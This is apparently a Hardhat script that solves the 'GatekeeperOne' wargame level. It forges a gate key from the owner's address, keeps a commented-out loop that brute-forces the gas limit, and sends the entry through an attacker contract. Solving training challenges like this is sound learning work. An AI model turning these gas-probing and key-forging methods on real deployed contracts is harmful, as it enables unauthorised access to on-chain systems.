const hre = require("hardhat");
const deploy = require("./deploy").deploy
const deployTest = require("./deploy_test").deploy
const ethers = hre.ethers;

require('dotenv').config()

async function main() {

  const [owner] = await ethers.getSigners();

  let gk = await ethers.getContractAt("GatekeeperOne", process.env.GK1)
  // if (hre.network.name == "hardhat") {
  //   gk = await deployTest();
  // }

  const crasher = hre.network.name == "hardhat"
    ? await deploy()
    : await ethers.getContractAt("GateCrasherOne", process.env.GC1);

  const key = '0x100000000000' + owner.address.substring(2 + 36);

  console.log("key", key)

  let gasLimit;

  // const baseGasLimit = 1e5;
  // for (let i = 0; i < 8191; i++){
  //   gasLimit = baseGasLimit + i;
  //   try {
  //     await crasher.enter(gk.address, key, { gasLimit });
  //     console.log("Gas to use: ", gasLimit) // 100314
  //     break;
  //   } catch(e) { }
  // }

  gasLimit = 100314;

  const tx = await crasher.enter(gk.address, key, { gasLimit });
  await tx.wait()

  console.log(`Entrant: ${await gk.entrant()}`)
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
